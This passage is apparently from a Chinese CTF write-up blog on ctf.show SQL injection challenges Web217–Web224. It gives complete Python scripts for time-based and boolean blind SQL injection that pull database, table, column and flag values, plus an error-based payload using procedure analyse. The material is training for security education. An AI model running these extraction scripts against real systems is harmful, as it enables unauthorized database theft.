src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664253688321-ff6bad34-b13e-4980-9028-62e7aaf295ef.png#averageHue=%23f7f5f4&clientId=u41cadc8f-314e-4&from=paste&height=230&id=u319e9253&name=image.png&originHeight=287&originWidth=1336&originalType=binary&ratio=1&rotation=0&showTitle=false&size=93073&status=done&style=none&taskId=u3c630dff-6016-43fe-9e0c-12677ca52e8&title=&width=1068.8" alt="image.png"><br>上脚本：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">url=<span class="string">&#x27;http://4eace14c-e88a-4f82-8808-fc4bbf45406c.challenge.ctf.show/api/&#x27;</span></span><br><span class="line">result=<span class="string">&#x27;&#x27;</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    head=<span class="number">1</span></span><br><span class="line">    tail=<span class="number">127</span></span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> head&lt;tail:</span><br><span class="line">        mid=(head+tail)<span class="comment">//2</span></span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="comment"># &quot;ip&quot;:f&quot;1) or if(ord(substr(database(),&#123;i&#125;,1))&gt;&#123;mid&#125;,(select benchmark( 300000, md5( &#x27;test&#x27; ))),1)#&quot;,</span></span><br><span class="line">            <span class="comment"># &quot;ip&quot;:f&quot;1) or if(ord(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;i&#125;,1))&gt;&#123;mid&#125;,(select benchmark(1500000, md5( &#x27;test&#x27; ))),1)#&quot;,</span></span><br><span class="line">            <span class="comment"># &quot;ip&quot;: f&quot;1) or if(ord(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagxccb&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;,(select benchmark(1500000, md5( &#x27;test&#x27; ))),1)#&quot;,</span></span><br><span class="line">            <span class="string">&quot;ip&quot;</span>: f<span class="string">&quot;&#x27;MQ==&#x27;) or if(ord(substr((select group_concat(flagaabc) from ctfshow_flagxccb),&#123;i&#125;,1))&gt;&#123;mid&#125;,(select benchmark(1500000, md5( &#x27;test&#x27; ))),1)#&quot;</span>,</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>:<span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">        t1=time.<span class="title function_ invoke__">time</span>()</span><br><span class="line">        r=requests.<span class="title function_ invoke__">post</span>(url,data=data)</span><br><span class="line">        t2=time.<span class="title function_ invoke__">time</span>()</span><br><span class="line">        <span class="comment"># print(t2-t1)#调试</span></span><br><span class="line">        <span class="keyword">if</span> t2-t1&gt;<span class="number">1</span>:</span><br><span class="line">            head=mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail=mid</span><br><span class="line">    <span class="keyword">if</span> head!=<span class="number">1</span>:</span><br><span class="line">        result+=<span class="title function_ invoke__">chr</span>(head)</span><br><span class="line">        <span class="keyword">print</span>(result)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>由于时间不确定，需要进行调试</p>
<h2 id="Web218-同上）"><a href="#Web218-同上）" class="headerlink" title="Web218(同上）"></a>Web218(同上）</h2><p>ban了benchmark<br>用笛卡尔积去延时，但是这个需要慢慢调试<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664261410627-2973cb0f-2e15-4750-bc77-ae42db0c16dc.png#averageHue=%23fbfaf9&clientId=u41cadc8f-314e-4&from=paste&height=249&id=ue2f0d3c2&name=image.png&originHeight=311&originWidth=1298&originalType=binary&ratio=1&rotation=0&showTitle=false&size=51385&status=done&style=none&taskId=u7ec5dd6c-cd17-442d-92da-ec0f15c9612&title=&width=1038.4" alt="image.png"><br>A,B,C表示别名用于区分，可以是同一张表</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">dirty=<span class="string">&quot;(SELECT count(*) FROM information_schema.columns A,information_schema.tables B,information_schema.schemata C)&quot;</span><span class="comment">#测试</span></span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">url=<span class="string">&#x27;http://c7f882b8-d040-4064-97ef-f8b497aeea15.challenge.ctf.show/api/&#x27;</span></span><br><span class="line">result=<span class="string">&#x27;&#x27;</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    head=<span class="number">1</span></span><br><span class="line">    tail=<span class="number">127</span></span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> head&lt;tail:</span><br><span class="line">        mid=(head+tail)<span class="comment">//2</span></span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="comment"># &quot;ip&quot;:f&quot;1) or if(ord(substr(database(),&#123;i&#125;,1))&gt;&#123;mid&#125;,&#123;dirty&#125;,1)#&quot;,</span></span><br><span class="line">            <span class="comment"># &quot;ip&quot;:f&quot;1) or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;i&#125;,1))&gt;&#123;mid&#125;,&#123;dirty&#125;,1)#&quot;,</span></span><br><span class="line">            <span class="comment"># &quot;ip&quot;: f&quot;1) or if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagxc&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;,&#123;dirty&#125;,1)#&quot;,</span></span><br><span class="line">            <span class="string">&quot;ip&quot;</span>: f<span class="string">&quot;1) or if(ascii(substr((select group_concat(flagaac) from ctfshow_flagxc),&#123;i&#125;,1))&gt;&#123;mid&#125;,&#123;dirty   &#125;,1)#&quot;</span>,</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>:<span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">        t1=time.<span class="title function_ invoke__">time</span>()</span><br><span class="line">        r=requests.<span class="title function_ invoke__">post</span>(url,data=data)</span><br><span class="line">        t2=time.<span class="title function_ invoke__">time</span>()</span><br><span class="line">        <span class="keyword">print</span>(t2-t1)<span class="comment">#调试</span></span><br><span class="line">        <span class="keyword">if</span> t2-t1&gt;<span class="number">0.4</span>:<span class="comment">#这边不稳定，要调试</span></span><br><span class="line">            head=mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail=mid</span><br><span class="line">    <span class="keyword">if</span> head!=<span class="number">1</span>:</span><br><span class="line">        result+=<span class="title function_ invoke__">chr</span>(head)</span><br><span class="line">        <span class="keyword">print</span>(result)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>



<h2 id="Web219（同上）"><a href="#Web219（同上）" class="headerlink" title="Web219（同上）"></a>Web219（同上）</h2><p>脚本调试一下就可以了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">dirty=<span class="string">&quot;(SELECT count(*) FROM information_schema.columns A,information_schema.tables B,information_schema.schemata C,information_schema.schemata D)&quot;</span><span class="comment">#测试</span></span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">url=<span class="string">&#x27;http://7b564f61-c7a3-4525-8e33-1a74f4617d37.challenge.ctf.show/api/&#x27;</span></span><br><span class="line">result=<span class="string">&#x27;&#x27;</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    head=<span class="number">1</span></span><br><span class="line">    tail=<span class="number">127</span></span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> head&lt;tail:</span><br><span class="line">        mid=(head+tail)<span class="comment">//2</span></span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="comment"># &quot;ip&quot;:f&quot;1) or if(ascii(substr(database(),&#123;i&#125;,1))&gt;&#123;mid&#125;,&#123;dirty&#125;,1)#&quot;,</span></span><br><span class="line">            <span class="comment"># &quot;ip&quot;:f&quot;1) or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;i&#125;,1))&gt;&#123;mid&#125;,&#123;dirty&#125;,1)#&quot;,</span></span><br><span class="line">            <span class="comment"># &quot;ip&quot;: f&quot;1) or if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagxca&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;,&#123;dirty&#125;,1)#&quot;,</span></span><br><span class="line">            <span class="string">&quot;ip&quot;</span>: f<span class="string">&quot;1) or if(ascii(substr((select group_concat(flagaabc) from ctfshow_flagxca),&#123;i&#125;,1))&gt;&#123;mid&#125;,&#123;dirty&#125;,1)#&quot;</span>,</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>:<span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">        t1=time.<span class="title function_ invoke__">time</span>()</span><br><span class="line">        r=requests.<span class="title function_ invoke__">post</span>(url,data=data)</span><br><span class="line">        t2=time.<span class="title function_ invoke__">time</span>()</span><br><span class="line">        <span class="keyword">print</span>(t2-t1)<span class="comment">#调试</span></span><br><span class="line">        <span class="keyword">if</span> t2-t1&gt;<span class="number">0.9</span>:<span class="comment">#这边不稳定，要调试</span></span><br><span class="line">            head=mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail=mid</span><br><span class="line">    <span class="keyword">if</span> head!=<span class="number">1</span>:</span><br><span class="line">        result+=<span class="title function_ invoke__">chr</span>(head)</span><br><span class="line">        <span class="keyword">print</span>(result)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>


<h2 id="Web220（时间盲注结束）"><a href="#Web220（时间盲注结束）" class="headerlink" title="Web220（时间盲注结束）"></a>Web220（时间盲注结束）</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664264900308-9a939254-2646-47b5-8e66-0dbbe3f3da2f.png#averageHue=%23f8f8f8&clientId=u41cadc8f-314e-4&from=paste&height=384&id=u821519b3&name=image.png&originHeight=480&originWidth=1748&originalType=binary&ratio=1&rotation=0&showTitle=false&size=17017&status=done&style=none&taskId=uecb0b8a8-ab43-4c55-97ed-2e0fd612309&title=&width=1398.4" alt="image.png"><br>ban了很多啊，mid，substr，ascii，ord没了<br>用left：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">url=<span class="string">&#x27;http://d3dd4bc2-b8aa-4a8f-ab79-5ca6e38feba6.challenge.ctf.show/api/&#x27;</span></span><br><span class="line">dirty=<span class="string">&quot;(SELECT count(*) FROM information_schema.columns A,information_schema.tables B,information_schema.schemata C,information_schema.schemata D)&quot;</span><span class="comment">#测试</span></span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import <span class="keyword">string</span></span><br><span class="line">result=<span class="string">&#x27;&#x27;</span></span><br><span class="line">s=<span class="string">&quot;_1234567890&#123;&#125;-qazwsxedcrfvtgbyhnujmikolp&quot;</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> j in s:</span><br><span class="line">        result+=j</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="comment"># &quot;ip&quot;:f&quot;1) or if(ascii(substr(database(),&#123;i&#125;,1))&gt;&#123;mid&#125;,&#123;dirty&#125;,1)#&quot;,</span></span><br><span class="line">            <span class="comment"># &quot;ip&quot;:f&quot;1) or if(left((select table_name from information_schema.tables where table_schema=database() limit 0,1),&#123;i&#125;)=&#x27;&#123;result&#125;&#x27;,&#123;dirty&#125;,1)#&quot;,</span></span><br><span class="line">            <span class="comment"># &quot;ip&quot;: f&quot;1) or if(left((select column_name from information_schema.columns where table_name=&#x27;ctfshow_flagxcac&#x27; limit 1,1),&#123;i&#125;)=&#x27;&#123;result&#125;&#x27;,&#123;dirty&#125;,1)#&quot;,</span></span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;ip&quot;</span>: f<span class="string">&quot;1) or if(left((select flagaabcc from ctfshow_flagxcac ),&#123;i&#125;)=&#x27;&#123;result&#125;&#x27;,&#123;dirty&#125;,1)#&quot;</span>,</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>:<span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">        t1=time.<span class="title function_ invoke__">time</span>()</span><br><span class="line">        r=requests.<span class="title function_ invoke__">post</span>(url,data=data)</span><br><span class="line">        t2=time.<span class="title function_ invoke__">time</span>()</span><br><span class="line">        <span class="comment"># print(t2-t1)#调试</span></span><br><span class="line">        <span class="keyword">if</span> t2-t1&gt;<span class="number">0.9</span>:<span class="comment">#这边不稳定，要调试</span></span><br><span class="line">            <span class="keyword">print</span>(result)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result=result[:-<span class="number">1</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h2 id="Web221（报错-优化查询）"><a href="#Web221（报错-优化查询）" class="headerlink" title="Web221（报错+优化查询）"></a>Web221（报错+优化查询）</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664291817522-9feb3a91-a675-417f-98da-1aef7b83dffd.png#averageHue=%23f8f7f7&clientId=u41cadc8f-314e-4&from=paste&height=569&id=u9d386d36&name=image.png&originHeight=711&originWidth=1747&originalType=binary&ratio=1&rotation=0&showTitle=false&size=29136&status=done&style=none&taskId=u5b71c6a8-efdd-4e68-adf3-db3cfba6929&title=&width=1397.6" alt="image.png"><br>查询语句中username没掉了，只留下limit和page，limit后面能跟的基本上只有 procedure analyse（）</p>
<ul>
<li>procedure analyse():<img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664291868337-7cf948d1-75cf-465f-b86a-01b8a2a0db58.png#averageHue=%23f9f7f6&clientId=u41cadc8f-314e-4&from=paste&height=716&id=u2dfe986a&name=image.png&originHeight=895&originWidth=1420&originalType=binary&ratio=1&rotation=0&showTitle=false&size=229863&status=done&style=none&taskId=u56d04694-d4dd-4a27-94c3-c200751c990&title=&width=1136" alt="image.png"></li>
</ul>
<p>procedure analyse()中有2个参数，在任意一个参数中使用报错注入即可：<br><code>[http://76d09576-b75d-4547-94bc-33fe3a540e8a.challenge.ctf.show/api/?page=2&amp;limit=1](http://76d09576-b75d-4547-94bc-33fe3a540e8a.challenge.ctf.show/api/?page=2&amp;limit=1) procedure analyse(1,extractvalue(rand(),concat(0x7e,database())))</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664291927093-050fd720-ac3e-4cbf-af17-d09f210ebcad.png#averageHue=%23f8f6f5&clientId=u41cadc8f-314e-4&from=paste&height=67&id=uc6d2d03b&name=image.png&originHeight=84&originWidth=1038&originalType=binary&ratio=1&rotation=0&showTitle=false&size=7218&status=done&style=none&taskId=ubb23a747-572d-4845-9774-49abadd5c35&title=&width=830.4" alt="image.png"></p>
<ul>
<li>关于报错注入的原理：</li>
</ul>
<p>因为是拿到数据库名字就算赢，所以数据库名字就算payload<br>ctfshow_web_flag_x</p>
<h2 id="Web222（group盲注）"><a href="#Web222（group盲注）" class="headerlink" title="Web222（group盲注）"></a>Web222（group盲注）</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664298977557-c1732f2a-86af-4f28-848c-5d89fa7cd27b.png#averageHue=%23f8f7f7&clientId=u41cadc8f-314e-4&from=paste&height=291&id=uc974a170&name=image.png&originHeight=364&originWidth=1681&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10966&status=done&style=none&taskId=ub6ad8c50-274d-4c2e-b7d7-70866e1df28&title=&width=1344.8" alt="image.png"><br>抓包分析：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664298985006-fc71e30a-50b3-4b02-a1d4-9afa0df082f4.png#averageHue=%23f7f7f7&clientId=u41cadc8f-314e-4&from=paste&height=221&id=u3242902f&name=image.png&originHeight=276&originWidth=1549&originalType=binary&ratio=1&rotation=0&showTitle=false&size=38382&status=done&style=none&taskId=uead29941-0416-4af1-8395-75712fc84c3&title=&width=1239.2" alt="image.png"><br>这样子可以成功延时<br>写脚本：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">url=<span class="string">&#x27;http://cc42cb4a-676c-4c30-a254-be3eb0350f5a.challenge.ctf.show/api/&#x27;</span></span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">result=<span class="string">&#x27;&#x27;</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    head=<span class="number">1</span></span><br><span class="line">    tail=<span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> head&lt;tail:</span><br><span class="line">        mid=(head+tail)&gt;&gt;<span class="number">1</span></span><br><span class="line">        <span class="comment"># payload = f&quot;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(0.05),1)&quot;</span></span><br><span class="line">        <span class="comment"># payload = f&quot;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flaga&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(0.05),1)&quot;</span></span><br><span class="line">        payload = f<span class="string">&quot;if(ascii(substr((select flagaabc from ctfshow_flaga),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(0.05),1)&quot;</span></span><br><span class="line"></span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;u&quot;</span>:payload</span><br><span class="line">        &#125;</span><br><span class="line">        t1=time.<span class="title function_ invoke__">time</span>()</span><br><span class="line">        r=requests.<span class="title function_ invoke__">get</span>(url,params=data)</span><br><span class="line">        t2=time.<span class="title function_ invoke__">time</span>()</span><br><span class="line">        <span class="keyword">print</span>(t2-t1)<span class="comment">#调试</span></span><br><span class="line">        <span class="keyword">if</span> t2-t1&gt;<span class="number">0.9</span>:<span class="comment">#这边不稳定，要调试</span></span><br><span class="line">            head=mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail=mid</span><br><span class="line">    <span class="keyword">if</span> head!=<span class="number">1</span>:</span><br><span class="line">        result+=<span class="title function_ invoke__">chr</span>(head)</span><br><span class="line">        <span class="keyword">print</span>(result)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment">#ctfshow&#123;bfaa3eca-5788-47d6-917e-1d1d999999a8&#125;</span></span><br></pre></td></tr></table></figure>
<p>结束</p>
<h2 id="Web223（布尔盲注）"><a href="#Web223（布尔盲注）" class="headerlink" title="Web223（布尔盲注）"></a>Web223（布尔盲注）</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664301411279-23047546-b187-4fb2-99d6-008f0d0f68a7.png#averageHue=%23f4f4f4&clientId=u41cadc8f-314e-4&from=paste&height=122&id=u220013dc&name=image.png&originHeight=153&originWidth=766&originalType=binary&ratio=1&rotation=0&showTitle=false&size=4242&status=done&style=none&taskId=u4fae2149-8d06-4350-9e25-806c15fac65&title=&width=612.8" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664301416732-3f364c8d-fde5-44e9-9bf9-94616ad6648c.png#averageHue=%23f1f1f0&clientId=u41cadc8f-314e-4&from=paste&height=72&id=u7c045cf1&name=image.png&originHeight=90&originWidth=428&originalType=binary&ratio=1&rotation=0&showTitle=false&size=3568&status=done&style=none&taskId=u98e11354-c609-41f2-b6ee-2140d263650&title=&width=342.4" alt="image.png"><br>ban掉了数字，我们需要改一下脚本，现在sleep函数就不太好用了，先分析一下<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664301445584-d5e8cc38-7d27-4eec-9a18-c83567db52a3.png#averageHue=%23d3d3d2&clientId=u41cadc8f-314e-4&from=paste&height=587&id=u04d7ffdd&name=image.png&originHeight=734&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=47074&status=done&style=none&taskId=u2c482b71-6fdf-4271-b924-c858f9f8418&title=&width=1536" alt="image.png"><br>如果为真，返回username，结果如上，如果为假，返回true，结果如下：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664301474848-23377d4d-7022-45a2-b230-dfb618443c95.png#averageHue=%23d0d0d0&clientId=u41cadc8f-314e-4&from=paste&height=605&id=uc37d567f&name=image.png&originHeight=756&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=45377&status=done&style=none&taskId=u97d21d9e-26a9-494e-b3b8-17a35d00a71&title=&width=1536" alt="image.png"><br>所以里面的“passwordAUTO”可以作为判断点：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">url=<span class="string">&#x27;http://1b9e5e11-fe7b-406a-bcf6-591deca928fb.challenge.ctf.show/api/&#x27;</span></span><br><span class="line">import requests</span><br><span class="line">result=<span class="string">&#x27;&#x27;</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line">def <span class="title function_ invoke__">getnumber</span>(i):</span><br><span class="line">    num=<span class="string">&#x27;true&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> num == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> num</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(i-<span class="number">1</span>):</span><br><span class="line">            num+=<span class="string">&#x27;+true&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    head=<span class="number">1</span></span><br><span class="line">    tail=<span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> head&lt;tail:</span><br><span class="line">        mid=(head+tail)&gt;&gt;<span class="number">1</span></span><br><span class="line">        <span class="comment"># payload = f&quot;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;getnumber(i)&#125;,true))&gt;&#123;getnumber(mid)&#125;,username,true)&quot;</span></span><br><span class="line">        <span class="comment"># payload = f&quot;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagas&#x27;),&#123;getnumber(i)&#125;,true))&gt;&#123;getnumber(mid)&#125;,username,true)&quot;</span></span><br><span class="line">        payload = f<span class="string">&quot;if(ascii(substr((select flagasabc from ctfshow_flagas),&#123;getnumber(i)&#125;,true))&gt;&#123;getnumber(mid)&#125;,username,true)&quot;</span></span><br><span class="line"></span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;u&quot;</span>:payload</span><br><span class="line">        &#125;</span><br><span class="line">        r=requests.<span class="title function_ invoke__">get</span>(url,params=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;passwordAUTO&quot;</span> in r.text:</span><br><span class="line">            head=mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail=mid</span><br><span class="line">    <span class="keyword">if</span> head!=<span class="number">1</span>:</span><br><span class="line">        result+=<span class="title function_ invoke__">chr</span>(head)</span><br><span class="line">        <span class="keyword">print</span>(result)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment">#ctfshow&#123;bfaa3eca-5788-47d6-917e-1d1d999999a8&#125;</span></span><br><span class="line"><span class="comment">#ctfshow&#123;9836e2d7-273d-4187-8d98-887bb54108b8&#125;</span></span><br></pre></td></tr></table></figure>
<p>稍微改了一下脚本,这里有一个关于groupby报错注入的知识点：</p>
<h2 id="Web224（finfo文件注入）"><a href="#Web224（finfo文件注入）" class="headerlink" title="Web224（finfo文件注入）"></a>Web224（finfo文件注入）</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664305421624-59990c77-4e2e-4283-bc3e-85f10fe5ca1b.png#averageHue=%23979ea5&clientId=u41cadc8f-314e-4&from=paste&height=478&id=u80c8c097&name=image.png&originHeight=598&originWidth=708&originalType=binary&ratio=1&rotation=0&showTitle=false&size=287716&status=done&style=none&taskId=uf96d23f7-d204-499a-96d4-11750e428d3&title=&width=566.4" alt="image.png"><br>没想到的是页面居然是一个登入界面，访问robots.txt：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664305442821-2c6543ed-a2f9-4e9b-b107-b19a833c1525.png#averageHue=%23fbfbfb&clientId=u41cadc8f-314e-4&from=paste&height=90&id=uc9956cbb&name=image.png&originHeight=113&originWidth=669&originalType=binary&ratio=1&rotation=0&showTitle=false&size=1630&status=done&style=none&taskId=u67a5e9e8-cea8-49ca-a687-cbd09fcfa65&title=&width=535.2" alt="image.png"><br>访问&#x2F;pwdreset.php：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664305456243-a15bbfcd-13fd-4d66-b121-60be50437629.png#averageHue=%237d8d9b&clientId=u41cadc8f-314e-4&from=paste&height=481&id=u9534b93e&name=image.png&originHeight=601&originWidth=732&originalType=binary&ratio=1&rotation=0&showTitle=false&size=304736&status=done&style=none&taskId=udbf20bb9-4240-42b2-a1ab-2d525108b0e&title=&width=585.6" alt="image.png"><br>是把admin管理员账号重置密码的地方，重置后登入：<br><img 